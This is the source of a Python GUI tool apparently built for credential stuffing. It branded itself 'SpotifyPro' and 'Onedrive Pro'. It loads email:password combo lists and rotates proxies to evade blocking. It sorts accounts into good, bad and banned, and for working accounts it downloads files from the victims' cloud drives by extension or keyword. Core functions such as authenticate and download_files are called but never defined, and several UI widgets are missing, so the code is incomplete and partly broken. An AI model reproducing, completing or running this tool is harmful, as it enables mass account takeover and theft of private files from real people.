import requests
import re
import os
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote
from collections import defaultdict, Counter
from datetime import datetime
import math
import threading
from colorama import init, Fore, Style
import sys
import string
import logging
import importlib
from mnemonic import Mnemonic
import gc

# Отключаем все сообщения логирования
logging.disable(logging.CRITICAL)

try:
    from tqdm import tqdm
except ImportError:
    print("pip install tqdm")
    sys.exit(1)

init(autoreset=True)

proxies = []
proxies_lock = threading.Lock()







def load_proxies_from_file(proxy_file):
    p = []
    with open(proxy_file, "r", encoding="utf-8") as f:
        for line in f:
            pr = line.strip()
            if pr:
                p.append(pr)
    return p if p else None

def load_proxies_from_link(link):
    try:
        resp = requests.get(link, timeout=10)
        resp.raise_for_status()
        lines = resp.text.splitlines()
        p = [ln.strip() for ln in lines if ln.strip()]
        return p if p else None
    except:
        return None

def get_random_proxy(current_proxies):
    return random.choice(current_proxies) if current_proxies else None




def save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, account, status, lock):
    try:
        with lock:
            if status == "good":
                good_file.write(f"{account}\n")
                good_file.flush()
                os.fsync(good_file.fileno())
            elif status == "bad":
                bad_file.write(f"{account}\n")
                bad_file.flush()
                os.fsync(bad_file.fileno())
            elif status == "banned":
                banned_file.write(f"{account}\n")
                banned_file.flush()
                os.fsync(banned_file.fileno())
            elif status == "error":
                error_file.write(f"{account}\n")
                error_file.flush()
                os.fsync(error_file.fileno())
            elif status == "rebrute":
                rebrute_file.write(f"{account}\n")
                rebrute_file.flush()
                os.fsync(rebrute_file.fileno())
            elif status == "reg":
                reg_file.write(f"{account}\n")
                reg_file.flush()
                os.fsync(reg_file.fileno())
    except Exception:
        pass

def update_proxies_from_link(link, interval):
    global proxies
    while True:
        new_proxies = load_proxies_from_link(link)
        if new_proxies:
            with proxies_lock:
                proxies = new_proxies
        else:
            with proxies_lock:
                proxies = []
        threading.Event().wait(interval * 60)


def run_processing(settings, log_callback, progress_callback, stop_event, app):
    try:
        with open("last_settings.json", "w", encoding="utf-8") as f:
            json.dump(settings, f, ensure_ascii=False, indent=4)
    except Exception as e:
        log_callback(f"Ошибка сохранения настроек: {e}\n")
    log_callback("Начало обработки...\n")
    script_dir = os.getcwd()
    current_time = datetime.now().strftime("results_%Y%m%d_%H%M")
    results_dir = os.path.join(script_dir, current_time)
    os.makedirs(results_dir, exist_ok=True)
    downloaded_files_dir = os.path.join(results_dir, "downloaded files")
    os.makedirs(downloaded_files_dir, exist_ok=True)
    file_path = settings["accounts_file"]

    # Итератор для построчного чтения файла
    def iter_lines(path):
        with open(path, "rb") as f:
            for raw_line in f:
                try:
                    line = raw_line.decode("utf-8", errors="strict").strip()
                except UnicodeDecodeError:
                    continue
                if line and ':' in line:
                    yield line

    # Подсчёт общего числа строк
    total = 0
    with open(file_path, "rb") as f:
        for raw_line in f:
            try:
                line = raw_line.decode("utf-8", errors="strict").strip()
            except UnicodeDecodeError:
                continue
            if line and ':' in line:
                total += 1

    log_callback(f"Всего аккаунтов: {total}\n")

    max_auth_workers = settings["threads"]
    mode_proxy = settings["mode_proxy"]
    global proxies
    if mode_proxy == "1":
        proxy_file = settings["proxy_file"]
        loaded = load_proxies_from_file(proxy_file)
        if not loaded:
            log_callback("Файл с прокси пуст или неверен.\n")
            return
        with proxies_lock:
            proxies[:] = loaded
        log_callback("Прокси загружены из файла.\n")
    elif mode_proxy == "2":
        proxy_link = settings["proxy_link"]
        interval = settings["proxy_interval"]
        t = threading.Thread(target=update_proxies_from_link, args=(proxy_link, interval), daemon=True)
        t.start()
        with proxies_lock:
            proxies[:] = load_proxies_from_link(proxy_link) or []
        log_callback("Прокси загружены по ссылке.\n")
    else:
        log_callback("Неверный режим прокси.\n")
        return

    main_mode = settings["main_mode"]
    if main_mode == "1":
        download_sub_mode = settings["download_sub_mode"]
        filter_list = settings["filter_list"]
        max_size_kb = settings["max_size_kb"]
    else:
        download_sub_mode = None
        filter_list = None
        max_size_kb = 0

    good_file_path = os.path.join(results_dir, "good.txt")
    bad_file_path = os.path.join(results_dir, "bad.txt")
    banned_file_path = os.path.join(results_dir, "banned.txt")
    error_file_path = os.path.join(results_dir, "error.txt")
    rebrute_file_path = os.path.join(results_dir, "rebrute.txt")
    reg_file_path = os.path.join(results_dir, "reg.txt")
    file_lock = threading.Lock()
    good_file = open(good_file_path, "a", encoding="utf-8", buffering=1)
    bad_file = open(bad_file_path, "a", encoding="utf-8", buffering=1)
    banned_file = open(banned_file_path, "a", encoding="utf-8", buffering=1)
    error_file = open(error_file_path, "a", encoding="utf-8", buffering=1)
    rebrute_file = open(rebrute_file_path, "a", encoding="utf-8", buffering=1)
    reg_file = open(reg_file_path, "a", encoding="utf-8", buffering=1)

    results = defaultdict(list)
    good = bad = error = banned = rebrute = reg_count = 0
    submitted_count = 0
    completed_count = 0
    lines_read = 0  # счетчик прочитанных строк

    max_pending = 10000
    future_to_account = {}
    auth_exec = ThreadPoolExecutor(max_workers=max_auth_workers)
    down_exec = ThreadPoolExecutor(max_workers=10) if main_mode == "1" else None

    # Получаем выбранный протокол прокси из настроек
    proxy_protocol = settings.get("proxy_protocol", "http").lower()

    # Основной цикл отправки задач
    for line in iter_lines(file_path):
        if stop_event.is_set():
            break
        lines_read += 1
        submitted_count += 1
        sess = requests.Session()
        fut = auth_exec.submit(authenticate, sess, line, proxy_protocol)
        future_to_account[fut] = line
        if len(future_to_account) >= max_pending:
            for fut_done in as_completed(list(future_to_account.keys())):
                if stop_event.is_set():
                    break
                line_done = future_to_account.pop(fut_done, None)
                try:
                    status, email, password, access_token, drive_id, used, remaining = fut_done.result()
                    completed_count += 1
                    if status == "good":
                        good += 1
                        results[status].append(line_done)
                        save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                        log_callback(f"{email}:{password} [+] Квота: {format_bytes(used)}/{format_bytes(remaining)}\n")
                        if main_mode == "1" and down_exec is not None:
                            down_exec.submit(
                                download_files,
                                email, password, access_token, drive_id,
                                downloaded_files_dir, results_dir,
                                used, remaining, file_lock,
                                download_sub_mode, filter_list, max_size_kb
                            )
                    elif status == "bad":
                        bad += 1
                        results[status].append(line_done)
                        save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                        log_callback(f"{email}:{password} [–]\n")
                    elif status == "banned":
                        banned += 1
                        results[status].append(line_done)
                        save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                        log_callback(f"{email}:{password} [~]\n")
                    elif status == "rebrute":
                        rebrute += 1
                        results[status].append(line_done)
                        save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                        log_callback(f"{email}:{password} [!]\n")
                    elif status == "reg":
                        reg_count += 1
                        results[status].append(line_done)
                        save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                        log_callback(f"{email}:{password} [REG]\n")
                    else:
                        error += 1
                        results['error'].append(line_done)
                        save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, "error", file_lock)
                        log_callback(f"{line_done} [Ошибка]\n")
                except Exception:
                    completed_count += 1
                    error += 1
                    results['error'].append(line_done)
                    save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, "error", file_lock)
                    log_callback(f"{line_done} [Ошибка]\n")
                gc.collect()
                progress_callback(total, completed_count, good, bad, error, banned, reg_count)
                if len(future_to_account) < max_pending or stop_event.is_set():
                    break

    # Отмена оставшихся задач, если стоп вызван
    if stop_event.is_set():
        for fut in list(future_to_account.keys()):
            fut.cancel()

    # Обработка оставшихся завершённых задач
    for fut in as_completed(list(future_to_account.keys())):
        if stop_event.is_set():
            break
        line_done = future_to_account.pop(fut, None)
        try:
            status, email, password, access_token, drive_id, used, remaining = fut.result()
            completed_count += 1
            if status == "good":
                good += 1
                results[status].append(line_done)
                save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                log_callback(f"{email}:{password} [+] Квота: {format_bytes(used)}/{format_bytes(remaining)}\n")
                if main_mode == "1" and down_exec is not None:
                    down_exec.submit(
                        download_files,
                        email, password, access_token, drive_id,
                        downloaded_files_dir, results_dir,
                        used, remaining, file_lock,
                        download_sub_mode, filter_list, max_size_kb
                    )
            elif status == "bad":
                bad += 1
                results[status].append(line_done)
                save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                log_callback(f"{email}:{password} [–]\n")
            elif status == "banned":
                banned += 1
                results[status].append(line_done)
                save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                log_callback(f"{email}:{password} [~]\n")
            elif status == "rebrute":
                rebrute += 1
                results[status].append(line_done)
                save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                log_callback(f"{email}:{password} [!]\n")
            elif status == "reg":
                reg_count += 1
                results[status].append(line_done)
                save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, status, file_lock)
                log_callback(f"{email}:{password} [REG]\n")
            else:
                error += 1
                results['error'].append(line_done)
                save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, "error", file_lock)
                log_callback(f"{line_done} [Ошибка]\n")
        except Exception:
            completed_count += 1
            error += 1
            results['error'].append(line_done)
            save_results_real_time(good_file, bad_file, banned_file, error_file, rebrute_file, reg_file, line_done, "error", file_lock)
            log_callback(f"{line_done} [Ошибка]\n")
        gc.collect()
        progress_callback(total, completed_count, good, bad, error, banned, reg_count)

    # Если остановка была вызвана и выбрано сохранение остатка,
    # переоткрываем файл и сохраняем все строки, начиная с номера lines_read
    if stop_event.is_set() and app.save_remainder:
        remaining_lines = []
        with open(file_path, "rb") as f:
            for i, raw_line in enumerate(f):
                if i < lines_read:
                    continue
                try:
                    line = raw_line.decode("utf-8", errors="strict").strip()
                except Exception:
                    continue
                if line and ':' in line:
                    remaining_lines.append(line)
        with open("остаток.txt", "w", encoding="utf-8") as f_out:
            f_out.write("\n".join(remaining_lines))
        log_callback("Остаток сохранён в файл 'остаток.txt'\n")
        app.remaining_accounts = remaining_lines

    if main_mode == "1" and down_exec is not None:
        down_exec.shutdown(wait=True)
    auth_exec.shutdown(wait=True)
    log_callback("\nИтог:\n")
    log_callback(f"Good: {good}\n")
    log_callback(f"Bad: {bad}\n")
    log_callback(f"Error: {error}\n")
    log_callback(f"Banned: {banned}\n")
    log_callback(f"REG: {reg_count}\n")
    log_callback(f"Обработано (завершено): {completed_count} из {total}\n")
    good_file.close()
    bad_file.close()
    banned_file.close()
    error_file.close()
    rebrute_file.close()
    reg_file.close()
    app.on_processing_finished()

from PyQt5 import QtWidgets, QtCore, QtGui
import qdarkstyle

LANGUAGES = {
    
    "en": {
        "header": "SpotifyPro ",
        "account_and_proxy": "Accounts and Proxy Settings",
        "file_accounts": "Accounts File:",
        "songs_file": "Songs File:",
        "PPA": "PPA:",
        "browse": "Browse",
        "proxy_mode": "Proxy Mode:",
        "from_file": "From File",
        "from_link": "From Link",
        "proxy_file": "Proxy File:",
        "proxy_link": "Proxy Link:",
        "proxy_interval": "Interval (min):",
        "proxy_protocol": "Proxy Protocol:",
        "threads": "Threads:",
        "Songs_settings": "Songs Settings",
        "main_mode": "Main Mode:",
        "download": "Download Files",
        "no_download": "No Download",
        "submode": "Submode:",
        "by_ext": "By Extensions",
        "by_kw": "By Keywords",
        "by_both": "By Extensions+Keywords",
        "internal": "Internal Search",
        "extensions": "Extensions (comma separated):",
        "keywords": "Keywords (comma separated):",
        "max_size": "Max Size (KB):",
        "progress": "Progress",
        "processed": "Processed: {processed} of {total}",
        "counters": "Good: {good} | Bad: {bad} | Error: {error} | Banned: {banned} | REG: {reg}",
        "start": "Start",
        "stop": "Stop"
    }
}

class ProcessingWorker(QtCore.QThread):
    log_signal = QtCore.pyqtSignal(str)
    progress_signal = QtCore.pyqtSignal(int, int, int, int, int, int, int)

    def __init__(self, settings, stop_event, parent=None):
        super().__init__(parent)
        self.settings = settings
        self.stop_event = stop_event
        self.app_ref = parent

    def run(self):
        def log_callback(message):
            self.log_signal.emit(message)
        def progress_callback(total, processed, good, bad, error, banned, reg):
            self.progress_signal.emit(total, processed, good, bad, error, banned, reg)
        run_processing(self.settings, log_callback, progress_callback, self.stop_event, self.app_ref)

class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        
        self.translations = LANGUAGES["en"]
        self.stop_event = threading.Event()
        self.worker = None
        self.save_remainder = False

        self.setWindowTitle(self.translations["header"])
        self.setWindowIcon(QtGui.QIcon("one.png"))
        self.resize(1100, 750)

        self.central_widget = QtWidgets.QWidget()
        self.setCentralWidget(self.central_widget)
        self.outer_layout = QtWidgets.QVBoxLayout(self.central_widget)

        header_layout = QtWidgets.QHBoxLayout()
        self.header_label = QtWidgets.QLabel()
        self.header_label.setText("<h1 style='margin: 0; text-align: center;'><span style='color: #ADD8E6;'>S</span>potifyPro</h1>")
        header_layout.addWidget(self.header_label)
        self.language_combo = QtWidgets.QComboBox()
        self.language_combo.setFixedWidth(150)
        self.language_combo.addItem(QtGui.QIcon("english_flag.png"), "English")
        self.language_combo.currentIndexChanged.connect(self.on_language_changed)
        header_layout.addWidget(self.language_combo)
        header_layout.setAlignment(self.language_combo, QtCore.Qt.AlignRight)
        self.outer_layout.addLayout(header_layout)

        self.setup_settings_area()
        self.setup_progress_area()
        self.load_previous_settings()

    def setup_settings_area(self):
        h_layout = QtWidgets.QHBoxLayout()

        self.group_accounts = QtWidgets.QGroupBox(self.translations["account_and_proxy"])
        layout_accounts = QtWidgets.QFormLayout(self.group_accounts)
        self.label_file_accounts = QtWidgets.QLabel(self.translations["file_accounts"])
        self.accounts_line = QtWidgets.QLineEdit()
        btn_accounts = QtWidgets.QPushButton(self.translations["browse"])
        btn_accounts.clicked.connect(self.browse_accounts)
        file_accounts_layout = QtWidgets.QHBoxLayout()
        file_accounts_layout.addWidget(self.accounts_line)
        file_accounts_layout.addWidget(btn_accounts)
        layout_accounts.addRow(self.label_file_accounts, file_accounts_layout)

        self.label_proxy_mode = QtWidgets.QLabel(self.translations["proxy_mode"])
        self.proxy_mode_combo = QtWidgets.QComboBox()
        self.proxy_mode_combo.addItems([self.translations["from_file"], self.translations["from_link"]])
        self.proxy_mode_combo.currentIndexChanged.connect(self.update_proxy_mode)
        layout_accounts.addRow(self.label_proxy_mode, self.proxy_mode_combo)

        self.label_proxy_file = QtWidgets.QLabel(self.translations["proxy_file"])
        self.proxy_file_line = QtWidgets.QLineEdit()
        btn_proxy_file = QtWidgets.QPushButton(self.translations["browse"])
        btn_proxy_file.clicked.connect(self.browse_proxy_file)
        proxy_file_layout = QtWidgets.QHBoxLayout()
        proxy_file_layout.addWidget(self.proxy_file_line)
        proxy_file_layout.addWidget(btn_proxy_file)
        layout_accounts.addRow(self.label_proxy_file, proxy_file_layout)

        self.label_proxy_link = QtWidgets.QLabel(self.translations["proxy_link"])
        self.proxy_link_line = QtWidgets.QLineEdit()
        layout_accounts.addRow(self.label_proxy_link, self.proxy_link_line)

        self.label_proxy_interval = QtWidgets.QLabel(self.translations["proxy_interval"])
        self.proxy_interval_line = QtWidgets.QLineEdit()
        layout_accounts.addRow(self.label_proxy_interval, self.proxy_interval_line)

        # Новое поле выбора протокола прокси
        self.label_proxy_protocol = QtWidgets.QLabel(self.translations["proxy_protocol"])
        self.proxy_protocol_combo = QtWidgets.QComboBox()
        self.proxy_protocol_combo.addItems(["http", "socks4", "socks5"])
        layout_accounts.addRow(self.label_proxy_protocol, self.proxy_protocol_combo)

        self.label_threads = QtWidgets.QLabel(self.translations["threads"])
        self.threads_line = QtWidgets.QLineEdit()
        layout_accounts.addRow(self.label_threads, self.threads_line)

        h_layout.addWidget(self.group_accounts)

        self.group_download = QtWidgets.QGroupBox(self.translations["Songs_settings"])
        layout_download = QtWidgets.QFormLayout(self.group_download)
        self.label_file_songs = QtWidgets.QLabel(self.translations["songs_file"])
        self.songs_line = QtWidgets.QLineEdit()
        btn_songs = QtWidgets.QPushButton(self.translations["browse"])
        btn_songs.clicked.connect(self.browse_songs)
        file_songs_layout = QtWidgets.QHBoxLayout()
        file_songs_layout.addWidget(self.songs_line)
        file_songs_layout.addWidget(btn_songs)

        layout_download.addRow(self.label_file_songs, file_songs_layout)

        self.label_PPA = QtWidgets.QLabel(self.translations["PPA"])
        self.PPA_line = QtWidgets.QLineEdit()
        layout_download.addRow(self.label_PPA, self.PPA_line)

        h_layout.addWidget(self.group_download)
        self.outer_layout.addLayout(h_layout)

        self.update_proxy_mode()

    def setup_progress_area(self):
        self.group_progress = QtWidgets.QGroupBox(self.translations["progress"])
        v_layout = QtWidgets.QVBoxLayout(self.group_progress)

        self.progress_bar = QtWidgets.QProgressBar()
        self.progress_bar.setValue(0)
        v_layout.addWidget(self.progress_bar)

        self.progress_label = QtWidgets.QLabel(self.translations["processed"].format(processed=0, total=0))
        v_layout.addWidget(self.progress_label)

        self.counters_label = QtWidgets.QLabel(self.translations["counters"].format(good=0, bad=0, error=0, banned=0, reg=0))
        v_layout.addWidget(self.counters_label)

        self.log_text = QtWidgets.QTextEdit()
        self.log_text.setReadOnly(True)
        v_layout.addWidget(self.log_text)

        self.start_stop_button = QtWidgets.QPushButton(self.translations["start"])
        self.start_stop_button.clicked.connect(self.start_stop_processing)
        v_layout.addWidget(self.start_stop_button)

        self.outer_layout.addWidget(self.group_progress)

    def update_ui_texts(self):
        self.setWindowTitle(self.translations["header"])
        self.header_label.setText("<h1 style='margin: 0; text-align: center;'><span style='color: #ADD8E6;'>O</span>nedrive Pro by Azazello1998</h1>")
        self.group_accounts.setTitle(self.translations["account_and_proxy"])
        self.label_file_accounts.setText(self.translations["file_accounts"])
        self.label_proxy_mode.setText(self.translations["proxy_mode"])
        self.label_proxy_file.setText(self.translations["proxy_file"])
        self.label_proxy_link.setText(self.translations["proxy_link"])
        self.label_proxy_interval.setText(self.translations["proxy_interval"])
        self.label_proxy_protocol.setText(self.translations["proxy_protocol"])
        self.label_threads.setText(self.translations["threads"])
        self.group_download.setTitle(self.translations["download_settings"])
        self.label_main_mode.setText(self.translations["main_mode"])
        self.label_submode.setText(self.translations["submode"])
        self.label_extensions.setText(self.translations["extensions"])
        self.label_keywords.setText(self.translations["keywords"])
        self.label_max_size.setText(self.translations["max_size"])
        self.group_progress.setTitle(self.translations["progress"])
        current_text = self.start_stop_button.text()
        if current_text in ( LANGUAGES["en"]["start"]):
            self.start_stop_button.setText(self.translations["start"])
        else:
            self.start_stop_button.setText(self.translations["stop"])
        self.progress_label.setText(self.translations["processed"].format(processed=0, total=0))
        self.counters_label.setText(self.translations["counters"].format(good=0, bad=0, error=0, banned=0, reg=0))
        self.proxy_mode_combo.clear()
        self.proxy_mode_combo.addItems([self.translations["from_file"], self.translations["from_link"]])
        self.main_mode_combo.clear()
        self.main_mode_combo.addItems([self.translations["download"], self.translations["no_download"]])
        self.submode_combo.clear()
        self.submode_combo.addItems([self.translations["by_ext"], self.translations["by_kw"],
                                     self.translations["by_both"], self.translations["internal"]])

    def browse_accounts(self):
        fname, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select accounts file", "", "Text Files (*.txt);;All Files (*)")
        if fname:
            self.accounts_line.setText(fname)

    def browse_songs(self):
        fname, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select songs file", "", "Text Files (*.txt);;All Files (*)")
        if fname:
            self.songs_line.setText(fname)
        
    def browse_proxy_file(self):
        fname, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select proxy file", "", "Text Files (*.txt);;All Files (*)")
        if fname:
            self.proxy_file_line.setText(fname)

    def update_proxy_mode(self):
        mode = self.proxy_mode_combo.currentText()
        if mode == self.translations["from_file"]:
            self.proxy_file_line.setEnabled(True)
            self.proxy_link_line.setEnabled(False)
            self.proxy_interval_line.setEnabled(False)
        else:
            self.proxy_file_line.setEnabled(False)
            self.proxy_link_line.setEnabled(True)
            self.proxy_interval_line.setEnabled(True)

    

    
    def start_stop_processing(self):
        if self.start_stop_button.text() == self.translations["start"]:
            settings = {}
            settings["accounts_file"] = self.accounts_line.text().strip()
            threads_str = self.threads_line.text().strip()
            settings["threads"] = int(threads_str) if threads_str.isdigit() else 10
            mode_proxy = self.proxy_mode_combo.currentText()
            if mode_proxy == self.translations["from_file"]:
                settings["mode_proxy"] = "1"
                settings["proxy_file"] = self.proxy_file_line.text().strip()
            else:
                settings["mode_proxy"] = "2"
                settings["proxy_link"] = self.proxy_link_line.text().strip()
                interval_str = self.proxy_interval_line.text().strip()
                settings["proxy_interval"] = int(interval_str) if interval_str.isdigit() else 5
            # Чтение выбранного протокола прокси
            settings["proxy_protocol"] = self.proxy_protocol_combo.currentText().strip().lower()

            main_mode = self.main_mode_combo.currentText()
            if main_mode == self.translations["download"]:
                settings["main_mode"] = "1"
                settings["download_sub_mode"] = str(self.submode_combo.currentIndex() + 1)
                exts = self.exts_line.text().strip()
                keys = self.keys_line.text().strip()
                if settings["download_sub_mode"] in ["1", "2"]:
                    if settings["download_sub_mode"] == "1":
                        settings["filter_list"] = [x.strip().lower() for x in exts.split(",") if x.strip()]
                    else:
                        settings["filter_list"] = [x.strip().lower() for x in keys.split(",") if x.strip()]
                else:
                    settings["filter_list"] = ([x.strip().lower() for x in exts.split(",") if x.strip()],
                                               [x.strip().lower() for x in keys.split(",") if x.strip()])
                size_str = self.max_size_line.text().strip()
                settings["max_size_kb"] = int(size_str) if size_str.isdigit() else 0
            else:
                settings["main_mode"] = "2"
            self.log("Settings are collected:\n" + json.dumps(settings, indent=4, ensure_ascii=False) + "\n")
            self.start_stop_button.setText(self.translations["stop"])
            self.stop_event.clear()
            self.worker = ProcessingWorker(settings, self.stop_event, parent=self)
            self.worker.log_signal.connect(self.log)
            self.worker.progress_signal.connect(self.update_progress)
            self.worker.start()
        else:
            reply = QtWidgets.QMessageBox.question(
                self,
                "Save the rest?",
                "Save the unprocessed lines?",
                QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No
            )
            self.save_remainder = (reply == QtWidgets.QMessageBox.Yes)
            self.stop_event.set()
            self.start_stop_button.setText(self.translations["start"])

    def log(self, message):
        # Отображаем в логе только сообщения с "[+]"
        if "[+]" in message:
            self.log_text.append(message)

    def update_progress(self, total, processed, good, bad, error, banned, reg):
        value = int((processed / total) * 100) if total > 0 else 0
        self.progress_bar.setValue(value)
        self.progress_label.setText(self.translations["processed"].format(processed=processed, total=total))
        self.counters_label.setText(self.translations["counters"].format(good=good, bad=bad, error=error, banned=banned, reg=reg))

    def on_processing_finished(self):
        self.start_stop_button.setText(self.translations["start"])
        self.log("Processing finished.\n")

    def load_previous_settings(self):
        if os.path.exists("last_settings.json"):
            reply = QtWidgets.QMessageBox.question(
                self,
                "Import settings",
                "Found saved settings. Import them?",
                QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No
            )
            if reply == QtWidgets.QMessageBox.Yes:
                try:
                    with open("last_settings.json", "r", encoding="utf-8") as f:
                        settings = json.load(f)
                    self.accounts_line.setText(settings.get("accounts_file", ""))
                    if settings.get("mode_proxy", "1") == "1":
                        self.proxy_mode_combo.setCurrentText(self.translations["from_file"])
                        self.proxy_file_line.setText(settings.get("proxy_file", ""))
                        self.proxy_link_line.clear()
                        self.proxy_interval_line.clear()
                    else:
                        self.proxy_mode_combo.setCurrentText(self.translations["from_link"])
                        self.proxy_link_line.setText(settings.get("proxy_link", ""))
                        self.proxy_interval_line.setText(str(settings.get("proxy_interval", 5)))
                        self.proxy_file_line.clear()
                    self.threads_line.setText(str(settings.get("threads", 10)))
                    # Установка сохранённого протокола прокси (если есть)
                    self.proxy_protocol_combo.setCurrentText(settings.get("proxy_protocol", "http"))
                    if settings.get("main_mode", "1") == "1":
                        self.main_mode_combo.setCurrentText(self.translations["download"])
                        self.submode_combo.setCurrentIndex(int(settings.get("download_sub_mode", "1")) - 1)
                        filter_list = settings.get("filter_list", "")
                        if isinstance(filter_list, list):
                            if self.submode_combo.currentText() == self.translations["by_ext"]:
                                self.exts_line.setText(", ".join(filter_list))
                                self.keys_line.clear()
                            elif self.submode_combo.currentText() == self.translations["by_kw"]:
                                self.keys_line.setText(", ".join(filter_list))
                                self.exts_line.clear()
                        elif isinstance(filter_list, (list, tuple)) and len(filter_list) == 2:
                            exts, keys = filter_list
                            self.exts_line.setText(", ".join(exts))
                            self.keys_line.setText(", ".join(keys))
                        self.max_size_line.setText(str(settings.get("max_size_kb", 0)))
                    else:
                        self.main_mode_combo.setCurrentText(self.translations["no_download"])
                    self.log("Settings are successfully imported.\n")
                except Exception as e:
                    QtWidgets.QMessageBox.critical(self, "Error", f"Failed to load settings: {e}")

    def on_language_changed(self, index):
        lang = self.language_combo.currentText()
        self.change_language(lang)
        self.update_ui_texts()

    def change_language(self, lang):
        self.language = "en"
        self.translations = LANGUAGES[self.language]
        self.setWindowTitle(self.translations["header"])
        self.log("Language changed.\n")

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
